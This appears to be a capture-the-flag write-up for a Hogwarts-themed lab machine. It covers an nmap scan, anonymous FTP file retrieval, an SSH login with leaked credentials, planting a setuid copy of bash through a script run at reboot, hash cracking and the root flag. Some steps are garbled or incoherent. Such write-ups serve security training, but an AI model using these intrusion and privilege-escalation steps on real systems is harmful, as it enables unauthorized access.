# Wizard

## Enumeration
```bash
└─$ nmap  -sV -A -p- -sC  10.10.197.180
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-20 14:30 BST
Nmap scan report for 10.10.197.180
Host is up (0.054s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.37.214
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3f:15:19:70:35:fd:dd:0d:07:a0:50:a3:7d:fa:10:a0 (RSA)
|   256 a8:67:5c:52:77:02:41:d7:90:e7:ed:32:d2:01:d9:65 (ECDSA)
|_  256 26:92:59:2d:5e:25:90:89:09:f5:e5:e0:33:81:77:6a (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
## Exploitation
```bash
ftp 10.10.197.180

get .hidden
cd ...
get reallyHidden
```

### On the ftp server I found the hagrid creds so i used it
```bash
sshpass -p 'IAlreadySaidTooMuch' ssh hagrid@10.10.197.180

Matching Defaults entries for hagrid on hogwarts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hagrid may run the following commands on hogwarts:
    (root) NOPASSWD: /sbin/reboot
```
```bash
cd /home/harry
 
cat .ssh/id_rsa.pub :
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGY+dwBeKw2NtTbGLN+3hpg+qZ9ebXvfkU+UZ/iP0TFmGWaYM0hFyE9oVSoldBmLmvJAfpjFk/kgglcQ0r5rhahEPI+jIYr/retdOf8hZYpCRr21DbGt2fLF3Bu2Io/Uvhur/i9Tc5RwD5pgfGqHKrf1qul5x4dWK36NU+uIeIIDveTuAcKCmTBZzM1rkwwaj7UKDiJ/N9+/i6E+TEEsuXd/isF/zhGa4oQTLpthn79Y4SAeV+SzmeAWeJbvHZHe/KrvHIOvCJcSN9bjJh76QuIZnLKTWJrscaE0qkhG5890l1P6s0auNgUuOHN5ZgGYfHsmSGQRQUhXHplXXL6CKF alice@looking-glass
```
## Privilege Escalation

### I found a script, I used his vulnerability rights
```
vim /home/hagrid/hut.sh

cp /bin/bash /home/hagrid
chmod +xs bash

sudo -u root /sbin/reboot
```

### Log as ron and see the dumbledore.txt file in dumbledore's home

```bash
cat dumbledore.txt : 
e1f22cea2a1c41f047b36b505a6aede84a848209c69505ac17ffdaebd7ba63c98e69f68f755134d7b94d47d0c86c1aea72f39fa4e89457cf8b25f19cd1b2dd33 : peek

3984d0b5033258950d886bc760a867399e57d8cc396c74beeaefc51168ccc7d11369e882d2e591619c42192102d550fdebb59db528f88bb46cc1a33a30b0ec0a : into

1f4be9bd3c61e621ef43bb2e0a2d7836786f730e4e0e6aa546899bceab0571904dfc6efc94c1324b1a22ae446f0a995b533054b1dbd09d0cda03e0985786d59a : this

c9f4875d9269814e2ddf825ce769cb77702034225818d8cad8d46c6483693fa28b8d4e3e053d1facbd774b1fc5a2b4cc31ef41a1129e58fc149d383dc2f1b647 : fine

e75baca2466b6805bdcfc52a12160ffaaf05677dd947c5b3019710d43ea18010fcb6c9ec0cde94efcb23a68bf9c7595798e77f4ff0602f468377d15392465b69 : list

de6bcbd90ff00c604a836fe2a0959c6a86aeabd440d8982970613edff3cd27996cd4a21c005e4dd4dca89c9a5d7a46fa9d97d2b220521dddf3b376fd04f2d0ba : and

7afc42427607f5171b9db17b38c3953ad5e614955cedbba9cfb97a276f3f3bd83fcfe61bdbfc799ca83865e446f3ae47998a624fd7316e7e56f7b27c9d67f150 : maybe

263adce0f04ee1eb3e75528ed5251724906bdd44c4265a1cd1185af010a4561e153833d1ea46df69764f2ece8e33199f8d787bf39cc51ebb406f15480c7e780e : you

7f5a8bf8b1779e4802c8e86dd1ea8e096be633d64eb8b5610ae9267af670734de1bf740427d05d454f5d4080aedf2b0821c1f338cd507e9b0dc9a0145bbff303 : will

806b977f3edfeda024f63584cc232c7b53ca0bba09cf9818346070f6489e775232f19d33390a78ba14f301a41a0c6994c2f7d95be6f6faeff9243f8e38c131f7 : find

1f40fc92da241694750979ee6cf582f2d5d7d28e18335de05abc54d0560e0f5302860c652bf08d560252aa5e74210546f369fbbbce8c12cfc7957b2652fe9a75 : a

c9f4875d9269814e2ddf825ce769cb77702034225818d8cad8d46c6483693fa28b8d4e3e053d1facbd774b1fc5a2b4cc31ef41a1129e58fc149d383dc2f1b647 : fine

b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86 : password

496e20666163742c2074686973207761732073696d706c652c207472756c792c207468652070617373776f72642069732042794d65726c696e4265617264210a : In fact, this was simple, truly, the password is ByMerlinBeard!
```
### After decrypt the hashes, I got the dumbledore password
```
su dumbledore : ByMerlinBeard!
```

### I launch a linpeas and I found the harry ssh private key

### Connect as harry with id_rsa key
```bash
./linpeas

sudo -h strawgoh /bin/bash
```

### I used cyberchef with magic to decrypt the root flag hash (53565a4a52564d324d315648546b56474e6a564455303957533064525746705353314a5156454e4f537a6448556c425555553161565539574d6b5244576c4e57536c4a5156456b7a5530564d4e544a45527a5255553064464e45565a5454493354314a5652454d7a556c705156555a425054303950513d3d): 

## Root FLAG
Flag : EPI{t3H_tRuTh_1T_15_4_834ut1fUL_4nD_t3rr18L3_th1n9}


